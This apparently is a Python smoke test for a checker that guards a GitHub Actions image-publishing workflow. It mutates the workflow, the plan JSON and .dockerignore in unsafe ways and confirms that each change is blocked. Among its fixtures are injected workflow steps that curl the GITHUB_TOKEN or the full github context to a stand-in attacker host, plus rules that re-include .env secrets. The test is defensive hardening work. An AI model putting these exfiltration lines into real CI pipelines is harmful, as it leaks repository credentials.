#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import importlib.util
import json
from pathlib import Path
import shutil
import tempfile

ROOT = Path(__file__).resolve().parents[3]
TOOL = ROOT / "tools/check_github_actions_ghcr_static_plan.py"
REQUIRED = (
    ".dockerignore",
    ".github/workflows/publish-backend-ghcr.yml",
    "deploy/github-actions-ghcr-static-plan.example.json",
    "docs/current/GITHUB_ACTIONS_GHCR_STATIC_WORKFLOW_PLAN.md",
)


def load_tool():
    spec = importlib.util.spec_from_file_location("v320_github_actions_plan", TOOL)
    if spec is None or spec.loader is None:
        raise RuntimeError("cannot load v320 GitHub Actions workflow checker")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def copy_fixture(temp: Path) -> None:
    for relative in REQUIRED:
        source = ROOT / relative
        target = temp / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, target)


def mutate_plan(temp: Path, callback) -> None:
    path = temp / "deploy/github-actions-ghcr-static-plan.example.json"
    payload = json.loads(path.read_text(encoding="utf-8"))
    callback(payload)
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def mutate_workflow(temp: Path, old: str, new: str) -> None:
    path = temp / ".github/workflows/publish-backend-ghcr.yml"
    text = path.read_text(encoding="utf-8")
    if old not in text:
        raise AssertionError(f"workflow fixture marker missing: {old}")
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


def expect_blocked(module, temp: Path, label: str = "unknown mutation") -> None:
    try:
        module.inspect_static_workflow_plan(temp)
    except module.StaticWorkflowPlanError:
        return
    raise AssertionError(f"unsafe v320 GitHub Actions workflow fixture was not blocked: {label}")


def expect_semantically_blocked(module, temp: Path, label: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutate_plan(temp, lambda payload: payload.update({"workflowSourceSha256": mutated_source_sha256}))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    try:
        expect_blocked(module, temp, f"semantic lock: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256


def expect_structurally_blocked(module, temp: Path, label: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutated_semantic_sha256 = module._canonical_sha256(module._load_workflow(workflow))
    mutate_plan(temp, lambda payload: payload.update({
        "workflowSourceSha256": mutated_source_sha256,
        "workflowSemanticSha256": mutated_semantic_sha256,
    }))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    original_semantic_sha256 = module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = mutated_semantic_sha256
    try:
        expect_blocked(module, temp, f"per-step structural lock: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256
        module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = original_semantic_sha256


def expect_secret_expression_blocked(module, temp: Path, label: str, run_step_key: str) -> None:
    workflow_path = temp / ".github/workflows/publish-backend-ghcr.yml"
    workflow = workflow_path.read_text(encoding="utf-8")
    payload = module._load_workflow(workflow)
    mutated_source_sha256 = hashlib.sha256(workflow.encode("utf-8")).hexdigest()
    mutated_semantic_sha256 = module._canonical_sha256(payload)
    job_name, step_name = run_step_key.split(":", 1)
    run = next(
        step["run"]
        for step in payload["jobs"][job_name]["steps"]
        if step["name"] == step_name
    )
    mutated_run_sha256 = hashlib.sha256(run.encode("utf-8")).hexdigest()
    mutate_plan(temp, lambda plan: plan.update({
        "workflowSourceSha256": mutated_source_sha256,
        "workflowSemanticSha256": mutated_semantic_sha256,
    }))
    original_source_sha256 = module.EXPECTED_WORKFLOW_SHA256
    original_semantic_sha256 = module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    original_run_sha256 = module.EXPECTED_RUN_STEP_SHA256[run_step_key]
    module.EXPECTED_WORKFLOW_SHA256 = mutated_source_sha256
    module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = mutated_semantic_sha256
    module.EXPECTED_RUN_STEP_SHA256[run_step_key] = mutated_run_sha256
    try:
        try:
            module.inspect_static_workflow_plan(temp)
        except module.StaticWorkflowPlanError as exc:
            if "secret/token expression" not in str(exc):
                raise AssertionError(f"unexpected blocker for {label}: {exc}") from exc
        else:
            raise AssertionError(f"parsed secret expression was not blocked: {label}")
    finally:
        module.EXPECTED_WORKFLOW_SHA256 = original_source_sha256
        module.EXPECTED_WORKFLOW_SEMANTIC_SHA256 = original_semantic_sha256
        module.EXPECTED_RUN_STEP_SHA256[run_step_key] = original_run_sha256


def main() -> int:
    module = load_tool()
    result = module.inspect_static_workflow_plan(ROOT)
    assert result["result"] == module.READY_RESULT
    assert result["trigger"] == "workflow_dispatch-only"
    assert result["workflowFilePresent"] is True
    assert result["workflowSourceSha256"] == module.EXPECTED_WORKFLOW_SHA256
    assert result["workflowSemanticSha256"] == module.EXPECTED_WORKFLOW_SEMANTIC_SHA256
    assert result["workflowCreationApproved"] is True
    assert result["workflowExecutionApproved"] is True
    assert result["workflowExecutionExecuted"] is False
    assert result["actionShasApproved"] is True
    assert result["actionsSettingsConfigured"] is True
    assert result["publishEnvironmentExists"] is True
    assert result["publishEnvironmentConfigured"] is False
    assert result["publishGateReady"] is False
    assert result["dockerBuildContextEnvExcluded"] is True
    assert result["reproducibleBuildReady"] is False
    assert result["supplyChainGate"] == "fail-closed"

    plan_mutations = (
        lambda p: p["triggerPolicy"]["allowedEvents"].append("push"),
        lambda p: p["permissionsPolicy"]["buildScanJob"].update({"packages": "write"}),
        lambda p: p["permissionsPolicy"]["publishSignVerifyJob"].update({"contents": "write"}),
        lambda p: p["permissionsPolicy"].update({"githubArtifactAttestationsPermission": "write"}),
        lambda p: p["actionPolicy"].update({"resolvedActionShasApproved": False}),
        lambda p: p["actionPolicy"]["allowlist"][0].update({"approvedSha": "0" * 40}),
        lambda p: p["actionPolicy"]["allowlist"][0].update({"upstreamTagCommitVerified": False}),
        lambda p: p.update({"workflowSourceSha256": "0" * 64}),
        lambda p: p.update({"workflowSemanticSha256": "0" * 64}),
        lambda p: p["dockerBuildContextPolicy"].update({"environmentReincludeAllowed": True}),
        lambda p: p["dockerBuildContextPolicy"].update({"dockerfileSpecificIgnoreAllowed": True}),
        lambda p: p["supplyChainGates"]["reproducibilityGate"].update({"status": "ready"}),
        lambda p: p["supplyChainGates"]["reproducibilityGate"].update({"sameSourceDeterministicBuildGuaranteed": True}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"severity": ["CRITICAL"]}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"ignoreUnfixed": True}),
        lambda p: p["supplyChainGates"].update({"automaticDeployment": True}),
        lambda p: p["repositoryReview"]["actionsSettings"].update({"allowedActions": "all"}),
        lambda p: p["repositoryReview"].update({"liveRecheckRequiredBeforeGateChange": False}),
        lambda p: p["repositoryReview"]["publishEnvironment"].update({"variablesCount": 1}),
        lambda p: p["requiredRepositorySetup"].update({"sourceControlledPublishGateReady": True}),
        lambda p: p["triggerPolicy"]["environment"].update({"sourceControlledGateValue": True}),
        lambda p: p["supplyChainGates"]["vulnerabilityGate"].update({"assetSha256": "0" * 64}),
        lambda p: p.update({"workflowExecutionExecuted": True}),
        lambda p: p.update({"registryMutationExecuted": True}),
        lambda p: p.update({"publishExecutionAllowedNow": True}),
    )
    for index, mutation in enumerate(plan_mutations, start=1):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_plan(temp, mutation)
            expect_blocked(module, temp, f"plan mutation {index}")

    workflow_mutations = (
        ("  workflow_dispatch:\n", "  push:\n"),
        ("  workflow_dispatch:\n", "  \"push\":\n"),
        (
            "jobs:\n  validate:\n",
            "jobs:\n  attacker:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      packages: write\n    steps:\n      - name: Unsafe extra job\n        run: echo unsafe\n  validate:\n",
        ),
        (
            "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0",
            "actions/checkout@v7",
        ),
        ("--severity HIGH,CRITICAL", "--severity CRITICAL"),
        ("--ignore-unfixed=false", "--ignore-unfixed=true"),
        (
            "TRIVY_SHA256: 8b4376d5d6befe5c24d503f10ff136d9e0c49f9127a4279fd110b727929a5aa9",
            "TRIVY_SHA256: " + "0" * 64,
        ),
        ("context: .", "context: backend"),
        ("provenance: mode=max", "provenance: mode=min"),
        ("sbom: true", "sbom: false"),
        (
            'PUBLISH_REVIEWER_GATE_READY: "false"',
            "PUBLISH_REVIEWER_GATE_READY: ${{ vars.PUBLISH_REVIEWER_GATE_READY }}",
        ),
        ("password: ${{ secrets.GITHUB_TOKEN }}", "password: ${{ secrets.GHCR_PAT }}"),
        ("tags: ${{ env.IMAGE_REPOSITORY }}:unverified-sha-${{ github.sha }}", "tags: ${{ env.IMAGE_REPOSITORY }}:latest"),
        (
            '            "$IMAGE_REPOSITORY@$DIGEST"\n',
            '            "$IMAGE_REPOSITORY@$DIGEST" || true\n',
        ),
        (
            "    steps:\n      - name: Check manual approval inputs\n",
            "    steps:\n      - name: Exfiltrate token\n        env:\n          TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: curl --data \"$TOKEN\" https://attacker.invalid\n      - name: Check manual approval inputs\n",
        ),
        (
            "      - name: Run fail-closed repository checks\n        run: |\n",
            "      - name: Run fail-closed repository checks\n        if: false\n        run: |\n",
        ),
    )
    for old, new in workflow_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_workflow(temp, old, new)
            expect_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")
            expect_semantically_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")
            expect_structurally_blocked(module, temp, f"workflow mutation {old!r} -> {new!r}")

    dockerignore_mutations = (
        ("**/.env\n", ""),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/.env\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/*\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!backend/**\n"),
        ("!deploy/secrets/README.md\n", "!deploy/secrets/README.md\n!**/*\n"),
    )
    for old, new in dockerignore_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            path = temp / ".dockerignore"
            text = path.read_text(encoding="utf-8")
            if old not in text:
                raise AssertionError(f"dockerignore fixture marker missing: {old!r}")
            path.write_text(text.replace(old, new, 1), encoding="utf-8")
            expect_blocked(module, temp, f"dockerignore mutation {old!r} -> {new!r}")

    with tempfile.TemporaryDirectory() as temp_dir:
        temp = Path(temp_dir)
        copy_fixture(temp)
        override = temp / "backend/Dockerfile.production.dockerignore"
        override.parent.mkdir(parents=True, exist_ok=True)
        override.write_text("*\n", encoding="utf-8")
        expect_blocked(module, temp, "Dockerfile-specific .dockerignore override")

    secret_expression_mutations = (
        '${{ github[\'token\'] }}',
        "${{ toJSON(github) }}",
    )
    emit_marker = '          echo "Verified candidate: $IMAGE_REPOSITORY@$DIGEST" >> "$GITHUB_STEP_SUMMARY"\n'
    emit_step_key = "publish_sign_verify:Emit verified candidate digest"
    for expression in secret_expression_mutations:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            copy_fixture(temp)
            mutate_workflow(
                temp,
                emit_marker,
                f'          curl --fail --data "{expression}" https://attacker.invalid\n',
            )
            expect_secret_expression_blocked(module, temp, expression, emit_step_key)

    print("OK: v320 GitHub Actions/GHCR fail-closed workflow smoke passed")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
